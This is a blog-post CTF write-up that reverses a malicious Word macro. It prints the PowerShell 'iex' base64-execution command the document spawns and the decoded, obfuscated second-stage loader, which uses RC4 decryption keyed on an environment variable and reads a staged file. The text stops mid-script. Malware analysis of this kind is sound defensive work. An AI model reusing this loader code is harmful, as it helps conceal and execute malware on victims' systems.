<!DOCTYPE html>
<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">Malware Reversing: A Malicious Word document | heckintosh</title>
<meta property="og:title" content="Malware Reversing: A Malicious Word document | heckintosh" />
<meta name="twitter:title" content="Malware Reversing: A Malicious Word document | heckintosh" />
<meta itemprop="name" content="Malware Reversing: A Malicious Word document | heckintosh" />
<meta name="application-name" content="Malware Reversing: A Malicious Word document | heckintosh" />
<meta property="og:site_name" content="Awesome hugo blog" />

<meta name="description" content="A challenge from GroupIB CTF">
<meta itemprop="description" content="A challenge from GroupIB CTF" />
<meta property="og:description" content="A challenge from GroupIB CTF" />
<meta name="twitter:description" content="A challenge from GroupIB CTF" />

<meta property="og:locale" content="en-us" />
<meta name="language" content="en-us" />

  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/word_malwarereverse/" title="" />



  <meta itemprop="image" content="http://localhost:1313/" />
  <meta property="og:image" content="http://localhost:1313/" />
  <meta name="twitter:image" content="http://localhost:1313/" />
  <meta name="twitter:image:src" content="http://localhost:1313/" />




    
    
    
    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2024-12-26T00:00:00Z />
    <meta property="article:published_time" content=2024-12-26T00:00:00Z />

    
    <meta property="og:article:author" content="Heckintosh" />
    <meta property="article:author" content="Heckintosh" />
    <meta name="author" content="Heckintosh" />
    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "Malware Reversing: A Malicious Word document",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2024-12-26",
        "description": "A challenge from GroupIB CTF",
        "wordCount":  779 ,
        "mainEntityOfPage": "True",
        "dateModified": "2024-12-26",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "heckintosh"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.126.3">

    

    <link rel="canonical" href="http://localhost:1313/posts/word_malwarereverse/">
    <link href="/style.min.dda29e9cdccea3ddcf0cab94237ee0b444e0a33c6670982287c2fdaf51fece19.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
<script>
    var _paq = window._paq = window._paq || [];
     
    _paq.push(['trackPageView']);
    _paq.push(['enableLinkTracking']);
    (function() {
      var u="//f2e9-49-193-188-255.ngrok-free.app/";
      _paq.push(['setTrackerUrl', u+'matomo.php']);
      _paq.push(['setSiteId', '1']);
      var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
      g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
    })();
  </script>
  
  
  
</head>
<body data-theme = "dark" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://localhost:1313/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        Home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/competitions/">
                        Competitions
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        Portfolio
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">Malware Reversing: A Malicious Word document</h1>
                
                
                <div class="post-meta">
                    <time datetime="2024-12-26T00:00:00&#43;00:00" itemprop="datePublished"> 26 Dec 2024 </time>
                </div>
                
            </header>
            <details class="toc">
                <summary><b>Table of Contents</b></summary>
                <nav id="TableOfContents">
  <ul>
    <li><a href="#static-analysis">Static analysis</a></li>
    <li><a href="#dynamic-analysis">Dynamic Analysis</a></li>
  </ul>
</nav>
            </details><div class="page-content">
                <p>This was a challenge from GroupIB CTF.</p>
<h2 id="static-analysis">Static analysis</h2>
<p>We were given a zip: <a href="https://drive.google.com/file/d/1nk7bH1SmX34VWUDFeSDtMGFxT1AkkrEH/view?usp=sharing">File</a>.
First unzip the file, the password is <code>infected</code>.
Unzipping the file, there is a Word document. Throwing it into VirusTotal:
<img src="../image/virustotal_groupib.png" alt="VirusTotal result"></p>
<p>Analyzing output of <strong>oleid</strong>:
<img src="../image/oleid_output.png" alt="oleid"></p>
<p>There exists a VBA Macro script in the file. I failed to extract the VBA using olevba (it outputs the whole pdf embedded in the docs for some reasons). Moving on to dynamic analysis now.</p>
<h2 id="dynamic-analysis">Dynamic Analysis</h2>
<p>Turn on Process Monitoring then view the doc file in Word. There is a Powershell process spawned from the WINWORD.EXE. It is trying to decode a base64 payload then execute it.</p>
<p><img src="../image/shellspawn.png" alt="alt text"></p>
<p><code>powershell.exe -Command &quot;iex([syStEM.tEXt.ENCOdING]::UtF8.gETstriNg([SYsTeM.COnvERt]:: froMBase64StRing('MALWARE PAYLOAD')));exit&quot;</code></p>
<p>Base64-decoded version of the malware:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="nv">$Yn0bWHiVBg6LTzSLvO5VyjFd8RoXvt6e7DILgQ5iLWs3SsNUWMdm2VrfjsTrQrxYVLkZAVK42ydYO0LQDgRAV0NDM7Jn1ELdaHBwu3Ti0URmtzFEEpV6VK7aRmvuBm9RiYVzD2XicaC4H78BpWzWwwBwyjLxtFqOIKymMatkYCWZaJ1Qfh264N5hLc61n77N0QY8QZhj7VZ0ePnfG9RCj6x6xQ7p4LR5DtaVK7pT0LVi72BvEg6Vuazq7JoYScRQQqwhKU0Ze9OMkZt8edSepAyYpJ1Olqrz1VT6yZunp2cpaMsn7LABFA81c6kQ4MEKqbwlbIfjDAbMFFZa4yYnWtx8vy8nJ9QLk2jIOfIjK1neZ5zqNpMYJ8ouF7aq1AwbSNgdGu1tdRxgP3xBvVQ1xxk6FMwnN7R6zPuvq8LTibSdE9Copr1AxJ5oPhLREc8pkef9wFsLx6VMzwxAafKqRlcLHc5t777FFVOmw0Z7Tq0kxVzzKMAtDpw3IrYtpXLCDciFXvdgamUqqnCf6igOUacVs4HEvCB9HmiwplnJlEUlk7jfpPFrSuhq9cbRQQNNl1VEpJIZY3zUyMvsOGYt66ICSx8QYnBkDFp1ewzyHF5IbC5YysPPV1qCbprYfEv1bZ2zDOTgtmNI8H4WdEEvqf6TYpow5P33ztTc4dgX3fm63U8qqOJ0vhfittA9hUEXKIpv0ajGgDZQAEQis4Z19UzhPip69rNal2LkxTrN5Jr0Yt2XDK2c1jzNJzvS13OUvT8pXdU4vPiZVdiN6UN2lJPc6XIx2UDpSQdMBVGiY00ePBKeZnAbHQauEXwVASrmF6VwREaa1986oTbbdFQXJW0uZ</span> <span class="p">=</span> <span class="s2">&#34;Ge&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$Ffu9ntkd4V4syJ6OD3xJXzEvafkYSo6GBgWyXZ2oRNfOVJbEBOx7bp8t8pzVChedtf2VhQdsjZwlywwcIc7PFEYTWsWDjVcl8olw0iBnnoj4YXBffT33za33T7jQCmVw8Rwpu2M61TQd5F4FnSZZHmaHzkPFjvz3m4VxBPzpfXuO53ZXsSkmuahxJGQ1D2swjIx0id3UYHozmakKRe1NUFKVdVJxyd8JZ4Th8wq94BA47R6Z8RgfZJA8VOutg9DJMIgRdJJMM1ryJ1y9wT5JZ8wh2mHWGT99FYxkADsXqiGRo1k6wP4QXCKGZbMAuzAfQnyY7zcW5QrCNEY0Vymk6tu1jSmKSbZYwJhspaL2rlcjQVTNAmMzsD9IQUCBwv9vRab10uSLgxv8erNd4JsQLXyu6Q0zsLn3g8A53d6qOi8TIsZarjooxznrxUx6xqyEGeIZPDTugcws2lWIgH7R7hcCzlpkge69eSDfTbdeNF4ap4JMgYwo7kMqffVi7dl0d7LjIHtFwulCuOkPLRJz11S7QepsfnAKJWEQul9m2ae2DUc5bbwf0dFBtXQ4z6Ew37xzRpoqLg7vUHwWFcPSzINAsuQs90SgiXAVITkAUXPe47eQ9dki77pbZLCxpVT4TmunHNx7L0asiw6Tr2koJ4TiwhLWuhNUZNNXeVcyylwtFxwvdnDuJu8jgUDQAuTX7DIIjQwtl9ywwJ2pM2JVDspeqDwsA5HLo0YEklMPJMsM9A6QHi56I3B5VWUAjD</span> <span class="p">=</span> <span class="s2">&#34;tByte&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$jwkL4IgQeAGhVxs4qqK05uE7nFJOsE2mg9wyFKwjkz5a2pyfSINcxwUnBGJM0VB92Q27wiAkyY2ZXTWVKwyt6tb42D48ULPjIn5xyAvqeBqicwE9us5XK2YdiBBSvZmdLhB2G5waGMVeJ1YDwD1bMEEpeHVzoVdKMWR4vNQlILUNWozzmIxZ0SYEQsrbJGDPADMUOZ31OJXWzAbhHZtItEAV0O7OMt5GwS0QSmkeOtRtjnhSIMf71jRpejYQEJAYW2BW22TN6NURxTQQbrPXc3IT5ZPj0LlDIDOwIeS4sN6rC1xgZD8iXpxgA4KJxipkLOLgfs8fQX0ZQOVkKwvD3qCzHqQXoB7nokZMw5DJzPEmnqi1biLIMILA7Tv1ejKiqJcQXkBxWV5wDV6JnGy2nFFwUj0wQOIxZzDG7fBx4T1u0MSN09lAW4a5ZxpJtSqm9cBZJIUqQIeQJO5TcXaZo0AbJ6BJaQa5QmhZyjRj6XpGQ1n7mFH7ZNFobt5JVZ9Ue9LwWkbzg5NGAnI8RJRB9ta5zX5JmOoNPLUHW5U8LNgKPHPhy2AUKx3RPTnoa5oVbpIU5l5KDp3E50wleYHK3vXOTZ5KGB5eEcqnMN8iCEVYK77FrPFtSr9kBiYx4JKEt8WV782trXgXywHmtiQOVYRxDjE9Gth98HwE8o4kwQEpW36k8iv0BfvAqowFOsVKNOUXwjPVaSaW3NmnCQCwQsV79ss3Lv6lHPHEFpEpR82hTDZqMBVAFokTakbM9jowUAA0uQkLEVfmtMRUd6h2KhNqlJn2kj3Y5HrnEN6N3xUgfswGLwKQlmLV1B6bMkBjrhtzpzJaCEqZXqu5dkahCyl7bVj8syysKlQ3wAkmCJEFMj7t58DPMei5ngV2vwfFagsmKUFKFmGmAhBoFi0lufjEThQHEXXvAEgmyoiM5Duu4RDKpWRaK1jKBJAKlzQeq52kEeLx5XdP8d2AAmnc3ePbRniuoPjhbrNN9PBM</span> <span class="p">=</span> <span class="s2">&#34;s&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$kghj3kCRqabNistCQgl7UP2Pdrg4cdoYim7gsRRwb8HF8XQN19jHpGGEtbHfQNaQxBbZrGOzsrSXh0z5vmHrcRTH9DBG1S1eC3ZJamrI8JeaQIDTNcK0nWJpUMdFAk6lIV3YXf2BOC98IEjhXYlUqiqzMzKbZsKPQhwvU5Jo7yyIaB4VoQH3gvsmllT1drH9Tk4VknoIwbTeCjsaM30irgyA8kjIoqpL9T6j3dN58t4pHI6oTpcCQ4BbQa9b5qm3RYIkmPlBdDp2ZjTgPbonO3xfqqUSBRrnlbMXwcHh0n83mR2dd5ENYltoO8vlJAN5PboH7zhJyjrU1H8x4GpRK9Fs6Ud2bB9Eyekx7RvVWJWQJEI2a3D4dl7pufAEINkuA6f6SGFobKAbODjZYEI9ulu83BcYTalEU34FDUu5VdcQpkC1vrBFBGHjuGuqrcs02NxbLgOkH9f4go9YtNqQoRtxOhCSarPSuwPFsfa6UvOJ8FHEAiFA6QDaUufnfz765blKu9ah2aq9SJzVmlqW3Tv5CypbLY33rJx3oqlWmY9C8dg9L5Zaz6Kcqz91uHT6r26YznS9HTekYZ94wjqs2wuVwmdgooP5xbsA6tY3Ty3G9wJVceBHoZYK9olLX0eoZOGdRp5BsfJIYQhZglX0dbW5UVser5VJ0cFGMf8q26WS4H3kUVKKvQP7TTw4nC1MAjBNlUrjWG2AmlNIzCtnsMFnd5qHLiKc9vRkxOOBxzbRI5iHlZfVVFvzEeVGTu1yN7Zy3yZASTaT650ZAdojKGFxcrLsZXx85RcGZTg2Kw92AoOnwjFOeYE0XsPXrbklc7hZHvTrlJD2HftSCobVBDqvm1vEyoJUsRTMSG5RefXhoK7jCP6Zefc7C</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$Yn0bWHiVBg6LTzSLvO5VyjFd8RoXvt6e7DILgQ5iLWs3SsNUWMdm2VrfjsTrQrxYVLkZAVK42ydYO0LQDgRAV0NDM7Jn1ELdaHBwu3Ti0URmtzFEEpV6VK7aRmvuBm9RiYVzD2XicaC4H78BpWzWwwBwyjLxtFqOIKymMatkYCWZaJ1Qfh264N5hLc61n77N0QY8QZhj7VZ0ePnfG9RCj6x6xQ7p4LR5DtaVK7pT0LVi72BvEg6Vuazq7JoYScRQQqwhKU0Ze9OMkZt8edSepAyYpJ1Olqrz1VT6yZunp2cpaMsn7LABFA81c6kQ4MEKqbwlbIfjDAbMFFZa4yYnWtx8vy8nJ9QLk2jIOfIjK1neZ5zqNpMYJ8ouF7aq1AwbSNgdGu1tdRxgP3xBvVQ1xxk6FMwnN7R6zPuvq8LTibSdE9Copr1AxJ5oPhLREc8pkef9wFsLx6VMzwxAafKqRlcLHc5t777FFVOmw0Z7Tq0kxVzzKMAtDpw3IrYtpXLCDciFXvdgamUqqnCf6igOUacVs4HEvCB9HmiwplnJlEUlk7jfpPFrSuhq9cbRQQNNl1VEpJIZY3zUyMvsOGYt66ICSx8QYnBkDFp1ewzyHF5IbC5YysPPV1qCbprYfEv1bZ2zDOTgtmNI8H4WdEEvqf6TYpow5P33ztTc4dgX3fm63U8qqOJ0vhfittA9hUEXKIpv0ajGgDZQAEQis4Z19UzhPip69rNal2LkxTrN5Jr0Yt2XDK2c1jzNJzvS13OUvT8pXdU4vPiZVdiN6UN2lJPc6XIx2UDpSQdMBVGiY00ePBKeZnAbHQauEXwVASrmF6VwREaa1986oTbbdFQXJW0uZ</span> <span class="p">+</span> <span class="nv">$Ffu9ntkd4V4syJ6OD3xJXzEvafkYSo6GBgWyXZ2oRNfOVJbEBOx7bp8t8pzVChedtf2VhQdsjZwlywwcIc7PFEYTWsWDjVcl8olw0iBnnoj4YXBffT33za33T7jQCmVw8Rwpu2M61TQd5F4FnSZZHmaHzkPFjvz3m4VxBPzpfXuO53ZXsSkmuahxJGQ1D2swjIx0id3UYHozmakKRe1NUFKVdVJxyd8JZ4Th8wq94BA47R6Z8RgfZJA8VOutg9DJMIgRdJJMM1ryJ1y9wT5JZ8wh2mHWGT99FYxkADsXqiGRo1k6wP4QXCKGZbMAuzAfQnyY7zcW5QrCNEY0Vymk6tu1jSmKSbZYwJhspaL2rlcjQVTNAmMzsD9IQUCBwv9vRab10uSLgxv8erNd4JsQLXyu6Q0zsLn3g8A53d6qOi8TIsZarjooxznrxUx6xqyEGeIZPDTugcws2lWIgH7R7hcCzlpkge69eSDfTbdeNF4ap4JMgYwo7kMqffVi7dl0d7LjIHtFwulCuOkPLRJz11S7QepsfnAKJWEQul9m2ae2DUc5bbwf0dFBtXQ4z6Ew37xzRpoqLg7vUHwWFcPSzINAsuQs90SgiXAVITkAUXPe47eQ9dki77pbZLCxpVT4TmunHNx7L0asiw6Tr2koJ4TiwhLWuhNUZNNXeVcyylwtFxwvdnDuJu8jgUDQAuTX7DIIjQwtl9ywwJ2pM2JVDspeqDwsA5HLo0YEklMPJMsM9A6QHi56I3B5VWUAjD</span> <span class="p">+</span> <span class="nv">$jwkL4IgQeAGhVxs4qqK05uE7nFJOsE2mg9wyFKwjkz5a2pyfSINcxwUnBGJM0VB92Q27wiAkyY2ZXTWVKwyt6tb42D48ULPjIn5xyAvqeBqicwE9us5XK2YdiBBSvZmdLhB2G5waGMVeJ1YDwD1bMEEpeHVzoVdKMWR4vNQlILUNWozzmIxZ0SYEQsrbJGDPADMUOZ31OJXWzAbhHZtItEAV0O7OMt5GwS0QSmkeOtRtjnhSIMf71jRpejYQEJAYW2BW22TN6NURxTQQbrPXc3IT5ZPj0LlDIDOwIeS4sN6rC1xgZD8iXpxgA4KJxipkLOLgfs8fQX0ZQOVkKwvD3qCzHqQXoB7nokZMw5DJzPEmnqi1biLIMILA7Tv1ejKiqJcQXkBxWV5wDV6JnGy2nFFwUj0wQOIxZzDG7fBx4T1u0MSN09lAW4a5ZxpJtSqm9cBZJIUqQIeQJO5TcXaZo0AbJ6BJaQa5QmhZyjRj6XpGQ1n7mFH7ZNFobt5JVZ9Ue9LwWkbzg5NGAnI8RJRB9ta5zX5JmOoNPLUHW5U8LNgKPHPhy2AUKx3RPTnoa5oVbpIU5l5KDp3E50wleYHK3vXOTZ5KGB5eEcqnMN8iCEVYK77FrPFtSr9kBiYx4JKEt8WV782trXgXywHmtiQOVYRxDjE9Gth98HwE8o4kwQEpW36k8iv0BfvAqowFOsVKNOUXwjPVaSaW3NmnCQCwQsV79ss3Lv6lHPHEFpEpR82hTDZqMBVAFokTakbM9jowUAA0uQkLEVfmtMRUd6h2KhNqlJn2kj3Y5HrnEN6N3xUgfswGLwKQlmLV1B6bMkBjrhtzpzJaCEqZXqu5dkahCyl7bVj8syysKlQ3wAkmCJEFMj7t58DPMei5ngV2vwfFagsmKUFKFmGmAhBoFi0lufjEThQHEXXvAEgmyoiM5Duu4RDKpWRaK1jKBJAKlzQeq52kEeLx5XdP8d2AAmnc3ePbRniuoPjhbrNN9PBM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$fILEPaTH</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$EnV:PROGRAMDATA</span><span class="s2">\CVR49A6.tmp.cvr&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ENvvaRnamE</span> <span class="p">=</span> <span class="s2">&#34;PROCESSOR_ARCHITECTURE&#34;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">UuZzxhNfzzykTVtsxxxYhNlHzaPpKKIbWqLloFdOT</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">param</span><span class="p">([</span><span class="no">Byte[]</span><span class="p">]</span><span class="nv">$kEy</span><span class="p">,</span> <span class="p">[</span><span class="no">Byte[]</span><span class="p">]</span><span class="nv">$Data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="nv">$S</span> <span class="p">=</span> <span class="mf">0</span><span class="p">.</span><span class="mf">.255</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$j</span> <span class="p">=</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="nv">$I</span> <span class="p">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nv">$I</span> <span class="o">-lt</span> <span class="mf">256</span><span class="p">;</span> <span class="nv">$I</span><span class="p">++)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="nv">$j</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="p">+</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">]</span> <span class="p">+</span> <span class="nv">$kEy</span><span class="p">[</span><span class="nv">$I</span> <span class="p">%</span> <span class="nv">$kEy</span><span class="p">.</span><span class="n">Length</span><span class="p">])</span> <span class="p">%</span> <span class="mf">256</span>
</span></span><span class="line"><span class="cl"> <span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">],</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">],</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$I</span> <span class="p">=</span> <span class="nv">$j</span> <span class="p">=</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$N</span> <span class="p">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nv">$N</span> <span class="o">-lt</span> <span class="nv">$Data</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="nv">$N</span><span class="p">++)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="nv">$I</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$I</span> <span class="p">+</span> <span class="mf">1</span><span class="p">)</span> <span class="p">%</span> <span class="mf">256</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$j</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="p">+</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">])</span> <span class="p">%</span> <span class="mf">256</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">],</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">],</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$k</span> <span class="p">=</span> <span class="nv">$S</span><span class="p">[(</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$I</span><span class="p">]</span> <span class="p">+</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="p">%</span> <span class="mf">256</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Data</span><span class="p">[</span><span class="nv">$N</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$Data</span><span class="p">[</span><span class="nv">$N</span><span class="p">]</span> <span class="o">-bxor</span> <span class="nv">$k</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="nv">$Data</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="p">=</span> <span class="p">[</span><span class="no">sySTEM.eNvIROnmENt</span><span class="p">]::</span><span class="n">GetEnvironmentVariable</span><span class="p">(</span><span class="nv">$ENvvaRnamE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span> <span class="mf">1</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$kEybYtEs</span> <span class="p">=</span> <span class="p">[</span><span class="no">SYSTEM.Text.eNcoDINg</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="nv">$kghj3kCRqabNistCQgl7UP2Pdrg4cdoYim7gsRRwb8HF8XQN19jHpGGEtbHfQNaQxBbZrGOzsrSXh0z5vmHrcRTH9DBG1S1eC3ZJamrI8JeaQIDTNcK0nWJpUMdFAk6lIV3YXf2BOC98IEjhXYlUqiqzMzKbZsKPQhwvU5Jo7yyIaB4VoQH3gvsmllT1drH9Tk4VknoIwbTeCjsaM30irgyA8kjIoqpL9T6j3dN58t4pHI6oTpcCQ4BbQa9b5qm3RYIkmPlBdDp2ZjTgPbonO3xfqqUSBRrnlbMXwcHh0n83mR2dd5ENYltoO8vlJAN5PboH7zhJyjrU1H8x4GpRK9Fs6Ud2bB9Eyekx7RvVWJWQJEI2a3D4dl7pufAEINkuA6f6SGFobKAbODjZYEI9ulu83BcYTalEU34FDUu5VdcQpkC1vrBFBGHjuGuqrcs02NxbLgOkH9f4go9YtNqQoRtxOhCSarPSuwPFsfa6UvOJ8FHEAiFA6QDaUufnfz765blKu9ah2aq9SJzVmlqW3Tv5CypbLY33rJx3oqlWmY9C8dg9L5Zaz6Kcqz91uHT6r26YznS9HTekYZ94wjqs2wuVwmdgooP5xbsA6tY3Ty3G9wJVceBHoZYK9olLX0eoZOGdRp5BsfJIYQhZglX0dbW5UVser5VJ0cFGMf8q26WS4H3kUVKKvQP7TTw4nC1MAjBNlUrjWG2AmlNIzCtnsMFnd5qHLiKc9vRkxOOBxzbRI5iHlZfVVFvzEeVGTu1yN7Zy3yZASTaT650ZAdojKGFxcrLsZXx85RcGZTg2Kw92AoOnwjFOeYE0XsPXrbklc7hZHvTrlJD2HftSCobVBDqvm1vEyoJUsRTMSG5RefXhoK7jCP6Zefc7C</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">-Path</span> <span class="nv">$fILEPaTH</span><span class="p">))</span> <span class="p">{</span> <span class="n">exit</span> <span class="mf">1</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$bASe64dATA</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="nv">$fILEPaTH</span> <span class="n">-Raw</span>
